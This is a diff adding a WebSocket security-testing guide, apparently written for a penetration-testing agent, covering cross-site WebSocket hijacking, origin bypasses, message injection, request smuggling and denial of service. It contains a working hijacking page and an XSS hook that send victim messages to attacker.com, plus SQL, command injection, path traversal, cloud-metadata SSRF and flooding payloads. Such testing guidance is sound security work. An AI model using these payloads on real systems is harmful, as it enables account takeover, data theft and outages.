@@ -1,0 +1,763 @@
+<websocket_hijacking_guide>
+<title>WEBSOCKET SECURITY TESTING</title>
+
+<critical>WebSocket connections create persistent, bidirectional channels that bypass traditional HTTP security controls. Focus on Cross-Site WebSocket Hijacking (CSWSH), message tampering, authentication bypass, origin validation, and request smuggling.</critical>
+
+<scope>
+- Cross-Site WebSocket Hijacking (CSWSH)
+- Message tampering and injection attacks
+- Authentication and session token theft
+- Origin validation bypass techniques
+- WebSocket to HTTP request smuggling
+- Message replay attacks
+- Connection hijacking and MitM
+- Protocol confusion and upgrade attacks
+</scope>
+
+<methodology>
+1. Identify WebSocket endpoints and handshake process
+2. Test origin validation and CSRF protections
+3. Analyze authentication mechanism (tokens, cookies, headers)
+4. Intercept and manipulate WebSocket messages
+5. Test for injection vulnerabilities in message handlers
+6. Examine connection upgrade and protocol validation
+7. Test rate limiting and resource exhaustion
+</methodology>
+
+<cswsh_attacks>
+<concept>
+{% raw %}
+# Cross-Site WebSocket Hijacking (CSWSH)
+# Similar to CSRF but for WebSocket connections
+
+# Vulnerable pattern:
+# 1. WebSocket uses cookies for authentication
+# 2. No origin validation or weak validation
+# 3. No CSRF token required for connection
+
+# Attack flow:
+# 1. Victim visits attacker's page
+# 2. Page opens WebSocket to vulnerable app
+# 3. Browser automatically sends authentication cookies
+# 4. Attacker can send/receive messages as victim
+{% endraw %}
+</concept>
+
+<detection>
+{% raw %}
+# Check if WebSocket authentication relies on cookies
+# Inspect handshake request:
+
+GET /ws/chat HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://example.com
+Cookie: session_id=abc123; auth_token=xyz789
+
+# If authentication is via cookies only -> Vulnerable to CSWSH
+# If no Origin validation -> Exploitable
+
+# Test with different origins:
+Origin: https://attacker.com
+Origin: null
+Origin: https://example.com.attacker.com
+
+# Burp Suite: Send WebSocket upgrade request with modified Origin
+{% endraw %}
+</detection>
+
+<exploitation>
+{% raw %}
+# Create malicious HTML page
+
+<!DOCTYPE html>
+<html>
+<head><title>CSWSH Attack</title></head>
+<body>
+<script>
+// Victim's browser will send auth cookies automatically
+var ws = new WebSocket('wss://vulnerable-app.com/ws/chat');
+
+ws.onopen = function(event) {
+    console.log('Connection opened');
+    
+    // Send messages as victim
+    ws.send(JSON.stringify({
+        type: 'message',
+        content: 'Attacker controlled message',
+        to: 'user123'
+    }));
+    
+    // Exfiltrate data
+    ws.send(JSON.stringify({
+        type: 'get_messages',
+        user_id: 'victim'
+    }));
+};
+
+ws.onmessage = function(event) {
+    console.log('Received:', event.data);
+    
+    // Exfiltrate to attacker server
+    fetch('https://attacker.com/log', {
+        method: 'POST',
+        body: event.data
+    });
+};
+
+ws.onerror = function(error) {
+    console.log('WebSocket Error:', error);
+};
+</script>
+</body>
+</html>
+
+# Host this page at https://attacker.com/cswsh.html
+# When victim visits, WebSocket opens with their cookies
+# Attacker can send/receive messages as victim
+{% endraw %}
+</exploitation>
+
+<bypass_techniques>
+{% raw %}
+# Origin validation bypass
+
+# Null origin (file://)
+Origin: null
+
+# Subdomain takeover
+Origin: https://vulnerable-subdomain.example.com
+
+# Domain confusion
+Origin: https://example.com.attacker.com
+Origin: https://attacker.com.example.com
+
+# Case manipulation
+Origin: https://EXAMPLE.COM
+Origin: https://Example.Com
+
+# Protocol confusion
+Origin: http://example.com  (if app expects https)
+Origin: wss://example.com
+
+# Trailing dots
+Origin: https://example.com.
+
+# Unicode/Punycode
+Origin: https://exаmple.com  (Cyrillic 'a')
+
+# If Origin not checked, omit header entirely
+(no Origin header)
+{% endraw %}
+</bypass_techniques>
+</cswsh_attacks>
+
+<authentication_attacks>
+<cookie_based_auth>
+{% raw %}
+# WebSocket using cookies for auth
+# Vulnerable to CSWSH if no additional protection
+
+# Check if connection succeeds with just cookies:
+GET /ws HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: ...
+Cookie: session_id=abc123
+
+# Test from different origin:
+Origin: https://attacker.com
+Cookie: session_id=abc123
+
+# If succeeds -> CSWSH vulnerability
+{% endraw %}
+</cookie_based_auth>
+
+<token_based_auth>
+{% raw %}
+# WebSocket using tokens in headers/query/messages
+
+# Token in URL (common but insecure)
+wss://example.com/ws?token=abc123
+# Token logged in access logs, browser history
+
+# Token in handshake header
+GET /ws HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Authorization: Bearer abc123
+
+# Token in first message
+# Connection established first, then auth message sent
+ws.send(JSON.stringify({
+    type: 'auth',
+    token: 'abc123'
+}));
+
+# Tests:
+# 1. Can connect without token?
+# 2. Can send messages before auth?
+# 3. Is token validated on every message?
+# 4. Can hijack connection after auth?
+{% endraw %}
+</token_based_auth>
+
+<auth_bypass>
+{% raw %}
+# Connection without authentication
+var ws = new WebSocket('wss://example.com/ws');
+ws.send(JSON.stringify({type: 'message', content: 'test'}));
+# Does it work without auth?
+
+# Invalid token
+wss://example.com/ws?token=invalid
+
+# Expired token
+wss://example.com/ws?token=<expired_jwt>
+
+# Token from different user
+wss://example.com/ws?token=<other_user_token>
+
+# Missing auth message
+# Open connection, send data messages without auth message
+
+# Replay old auth message
+# Capture valid auth message, replay after logout
+{% endraw %}
+</auth_bypass>
+
+<session_fixation>
+{% raw %}
+# Force victim to use attacker's WebSocket session
+
+# If session ID in URL:
+wss://example.com/ws?session=attacker_controlled_id
+
+# Victim clicks link with attacker's session ID
+# Victim authenticates
+# Attacker's session now authenticated as victim
+
+# Similar to session fixation in HTTP
+{% endraw %}
+</session_fixation>
+</authentication_attacks>
+
+<message_attacks>
+<message_tampering>
+{% raw %}
+# Intercept and modify WebSocket messages
+
+# Tools:
+# - Burp Suite (WebSocket History, Intercept)
+# - OWASP ZAP (WebSocket tab)
+# - wscat (command-line)
+# - websocat (advanced command-line)
+# - Browser DevTools (Network -> WS)
+
+# Example: Modify chat message
+# Original:
+{
+  "type": "message",
+  "content": "Hello",
+  "from": "user123",
+  "to": "user456"
+}
+
+# Tampered:
+{
+  "type": "message",
+  "content": "Attacker message",
+  "from": "admin",
+  "to": "user456"
+}
+
+# Test if 'from' field is validated
+# Can you impersonate other users?
+{% endraw %}
+</message_tampering>
+
+<injection_attacks>
+{% raw %}
+# Inject payloads in WebSocket messages
+
+# SQL Injection
+ws.send(JSON.stringify({
+    type: 'search',
+    query: "test' OR '1'='1"
+}));
+
+ws.send(JSON.stringify({
+    type: 'user_lookup',
+    email: "admin@example.com' OR 1=1--"
+}));
+
+# NoSQL Injection
+ws.send(JSON.stringify({
+    type: 'find',
+    query: {"$gt": ""}
+}));
+
+# Command Injection
+ws.send(JSON.stringify({
+    type: 'process',
+    filename: "data.txt; cat /etc/passwd"
+}));
+
+# XSS (if messages displayed in web UI)
+ws.send(JSON.stringify({
+    type: 'message',
+    content: "<script>alert(document.cookie)</script>"
+}));
+
+ws.send(JSON.stringify({
+    type: 'message',
+    content: "<img src=x onerror=alert(1)>"
+}));
+
+# Path Traversal
+ws.send(JSON.stringify({
+    type: 'read_file',
+    path: "../../../etc/passwd"
+}));
+
+# SSRF
+ws.send(JSON.stringify({
+    type: 'fetch_url',
+    url: "http://169.254.169.254/latest/meta-data/"
+}));
+
+# Template Injection
+ws.send(JSON.stringify({
+    type: 'render',
+    template: "{{7*7}}"
+}));
+{% endraw %}
+</injection_attacks>
+
+<mass_assignment>
+{% raw %}
+# Inject privileged fields
+
+# User profile update
+ws.send(JSON.stringify({
+    type: 'update_profile',
+    user_id: 'user123',
+    email: 'new@example.com',
+    role: 'admin',           // Privileged field
+    is_verified: true,        // Privileged field
+    balance: 999999           // Privileged field
+}));
+
+# Check if server validates all fields
+# Or blindly accepts entire JSON object
+{% endraw %}
+</mass_assignment>
+
+<prototype_pollution>
+{% raw %}
+# JavaScript prototype pollution via WebSocket
+
+ws.send(JSON.stringify({
+    type: 'update',
+    "__proto__": {
+        "isAdmin": true
+    }
+}));
+
+ws.send(JSON.stringify({
+    type: 'settings',
+    "constructor": {
+        "prototype": {
+            "isAdmin": true
+        }
+    }
+}));
+
+# If server-side JavaScript parses message carelessly
+# May pollute Object prototype
+{% endraw %}
+</prototype_pollution>
+
+<message_replay>
+{% raw %}
+# Replay captured messages
+
+# Capture legitimate message:
+{
+    "type": "transfer",
+    "from": "user123",
+    "to": "user456",
+    "amount": 100,
+    "timestamp": 1234567890
+}
+
+# Replay later
+# Does server check:
+# - Timestamp freshness?
+# - Message nonce/ID?
+# - Transaction state?
+
+# Multiple replays (duplicate action)
+for (let i = 0; i < 10; i++) {
+    ws.send(captured_message);
+}
+{% endraw %}
+</message_replay>
+</message_attacks>
+
+<origin_validation>
+<testing_origin>
+{% raw %}
+# Test Origin header validation
+
+# No Origin header
+# Some implementations don't require it
+
+GET /ws HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: ...
+(no Origin header)
+
+# Arbitrary origin
+Origin: https://attacker.com
+
+# Null origin
+Origin: null
+
+# File protocol
+Origin: file://
+
+# Subdomain
+Origin: https://sub.example.com
+
+# If any of these succeed -> weak validation
+{% endraw %}
+</testing_origin>
+
+<bypass_methods>
+{% raw %}
+# Common origin validation flaws
+
+# Substring matching
+# App checks if origin contains "example.com"
+Origin: https://example.com.attacker.com  ✓ passes
+Origin: https://attacker.com/example.com  ✓ passes
+
+# Regex bypass
+# App uses: ^https://.*example\.com$
+Origin: https://attacker.com#example.com  ✓ passes
+
+# Case-insensitive  
+Origin: https://EXAMPLE.COM
+
+# Whitelist bypass via subdomain takeover
+# If app allows *.example.com
+# Find takeover-able subdomain
+
+# Protocol mismatch not checked
+# App expects https, send http
+Origin: http://example.com
+
+# Port number not checked
+Origin: https://example.com:8080
+{% endraw %}
+</bypass_methods>
+</origin_validation>
+
+<request_smuggling>
+<ws_to_http_smuggling>
+{% raw %}
+# WebSocket connection upgrade can be exploited
+
+# HTTP request smuggling via WebSocket
+
+# Step 1: Establish WebSocket connection
+GET /ws HTTP/1.1
+Host: example.com
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: ...
+
+# Step 2: Send crafted WebSocket frame
+# That looks like HTTP request to backend
+
+# If backend mishandles WebSocket frames
+# May interpret frame data as new HTTP request
+
+# Payload in WebSocket frame:
+GET /admin HTTP/1.1
+Host: example.com
+X-Ignore: 
+
+# Backend may process this as separate HTTP request
+# Bypassing frontend controls
+{% endraw %}
+</ws_to_http_smuggling>
+
+<upgrade_confusion>
+{% raw %}
+# Connection upgrade manipulation
+
+# Upgrade to unexpected protocol
+GET / HTTP/1.1
+Host: example.com
+Connection: Upgrade
+Upgrade: h2c
+Sec-WebSocket-Version: 13
+
+# Mix WebSocket and HTTP/2 headers
+# May confuse reverse proxy/load balancer
+
+# Invalid WebSocket version
+Sec-WebSocket-Version: 99
+
+# Multiple Upgrade headers
+Upgrade: websocket, h2c
+
+# Protocol downgrade attack
+Sec-WebSocket-Version: 0
+{% endraw %}
+</upgrade_confusion>
+</request_smuggling>
+
+<dos_attacks>
+<connection_exhaustion>
+{% raw %}
+# Open many WebSocket connections
+
+for (let i = 0; i < 10000; i++) {
+    new WebSocket('wss://example.com/ws?id=' + i);
+}
+
+# Check if server limits:
+# - Connections per IP
+# - Connections per user
+# - Total concurrent connections
+{% endraw %}
+</connection_exhaustion>
+
+<message_flooding>
+{% raw %}
+# Send many messages rapidly
+
+var ws = new WebSocket('wss://example.com/ws');
+ws.onopen = function() {
+    for (let i = 0; i < 100000; i++) {
+        ws.send(JSON.stringify({
+            type: 'message',
+            content: 'spam ' + i
+        }));
+    }
+};
+
+# Test rate limiting:
+# - Messages per second
+# - Message size limits
+# - Queue depth limits
+{% endraw %}
+</message_flooding>
+
+<large_messages>
+{% raw %}
+# Send very large messages
+
+var ws = new WebSocket('wss://example.com/ws');
+ws.onopen = function() {
+    // 100MB message
+    var large = 'A'.repeat(100 * 1024 * 1024);
+    ws.send(large);
+};
+
+# Test if server enforces message size limit
+# May cause memory exhaustion
+{% endraw %}
+</large_messages>
+
+<ping_pong_abuse>
+{% raw %}
+# WebSocket ping/pong frames for keepalive
+
+# Send many ping frames
+# Server must respond with pong
+# Can exhaust resources
+
+# Requires low-level WebSocket library
+# Browser WebSocket API doesn't expose ping/pong
+{% endraw %}
+</ping_pong_abuse>
+</dos_attacks>
+
+<advanced_techniques>
+<connection_hijacking>
+{% raw %}
+# Man-in-the-middle attack on WebSocket
+
+# If using ws:// (no TLS)
+# Attacker can intercept and modify messages
+
+# Even with wss:// (TLS)
+# Check for:
+# - Certificate validation
+# - Pinning
+# - Mixed content (ws:// from https:// page)
+
+# Test: Can victim be downgraded to ws://?
+<script>
+var ws = new WebSocket('ws://example.com/ws');  // Insecure
+</script>
+{% endraw %}
+</connection_hijacking>
+
+<token_theft>
+{% raw %}
+# Steal authentication tokens from WebSocket
+
+# XSS to access WebSocket messages
+<script>
+var originalWebSocket = WebSocket;
+window.WebSocket = function(...args) {
+    var ws = new originalWebSocket(...args);
+    
+    var originalSend = ws.send;
+    ws.send = function(data) {
+        // Intercept outgoing messages
+        fetch('https://attacker.com/log', {
+            method: 'POST',
+            body: 'OUT: ' + data
+        });
+        return originalSend.apply(this, arguments);
+    };
+    
+    var originalOnMessage = ws.onmessage;
+    ws.onmessage = function(event) {
+        // Intercept incoming messages
+        fetch('https://attacker.com/log', {
+            method: 'POST',
+            body: 'IN: ' + event.data
+        });
+        if (originalOnMessage) {
+            return originalOnMessage.apply(this, arguments);
+        }
+    };
+    
+    return ws;
+};
+</script>
+
+# If auth token sent in messages, attacker captures it
+{% endraw %}
+</token_theft>
+
+<cross_protocol_attacks>
+{% raw %}
+# WebSocket combined with other protocols
+
+# WebSocket + PostMessage
+# Exfiltrate data via postMessage to attacker iframe
+
+# WebSocket + Service Worker
+# Service worker intercepts WebSocket upgrade
+# Can modify handshake
+
+# WebSocket + WebRTC
+# Use WebSocket for signaling
+# But WebRTC data channel for actual data
+# Split attack surface
+{% endraw %}
+</cross_protocol_attacks>
+</advanced_techniques>
+
+<testing_tools>
+{% raw %}
+# Browser DevTools
+# Network tab -> WS filter
+# View all WebSocket connections and messages
+
+# Burp Suite
+# Proxy -> WebSocket History
+# Intercept WebSocket messages
+# Spider/Scanner may not test WebSocket well
+
+# OWASP ZAP
+# WebSockets tab
+# Breakpoints on WebSocket messages
+
+# wscat (command-line WebSocket client)
+npm install -g wscat
+wscat -c wss://example.com/ws
+
+# websocat (advanced WebSocket tool)
+websocat wss://example.com/ws
+
+# Python websocket-client
+import websocket
+ws = websocket.WebSocket()
+ws.connect("wss://example.com/ws")
+ws.send(json.dumps({...}))
+result = ws.recv()
+
+# JavaScript WebSocket API
+var ws = new WebSocket('wss://example.com/ws');
+ws.onopen = function() { ws.send('test'); };
+ws.onmessage = function(event) { console.log(event.data); };
+{% endraw %}
+</testing_tools>
+
+<validation>
+1. Demonstrate CSWSH by opening WebSocket from attacker origin
+2. Show authentication bypass or token theft
+3. Prove message injection (SQL, XSS, command injection)
+4. Document origin validation bypass technique
+5. Show message tampering (impersonation, privilege escalation)
+6. Provide working proof-of-concept HTML page
+7. Include WebSocket message logs showing exploitation
+</validation>
+
+<false_positives>
+- WebSocket requires CSRF token in handshake
+- Token-based auth (not cookies) with proper validation
+- Strong origin validation with no bypass
+- Message integrity checks (HMAC, signatures)
+- Per-message authorization
+- Rate limiting enforced
+- Input validation on all message fields
+</false_positives>
+
+<impact>
+- Cross-Site WebSocket Hijacking (CSWSH)
+- Authentication bypass
+- Session hijacking
+- Data exfiltration
+- Message injection and tampering
+- User impersonation
+- Remote code execution via injection
+- Denial of service
+</impact>
+
+<pro_tips>
+1. Always test for CSWSH if cookies are used
+2. Origin header is easily spoofed—must be validated server-side
+3. Check if auth token sent in URL (logged, cached)
+4. Test message handlers for all injection types
+5. Replay captured messages—check for nonce/timestamp validation
+6. Try injecting privileged fields in messages
+7. WebSocket security often overlooked compared to HTTP
+8. Test both handshake and message-level authentication
+9. Check if messages validated on every send or just at connection
+10. Use Burp/ZAP to intercept and modify live messages
+11. Browser DevTools excellent for monitoring WebSocket traffic
+12. ws:// (unencrypted) should never be used in production
+13. Mixed content (ws:// from https://page) often allowed by browsers
+14. Protocol upgrade phase is complex—potential for smuggling
+15. Test all message types—authorization may be inconsistent
+</pro_tips>
+
+<remember>WebSocket security is fundamentally different from HTTP. Persistent connections bypass many traditional security controls. CSWSH is the WebSocket equivalent of CSRF. Cookie-based authentication without additional protection is almost always vulnerable. Origin validation must be rigorous and server-side. Every message type needs separate authentication and authorization checks. Message tampering and injection are high-value attacks. Test WebSocket as thoroughly as you test HTTP APIs.</remember>
+</websocket_hijacking_guide>
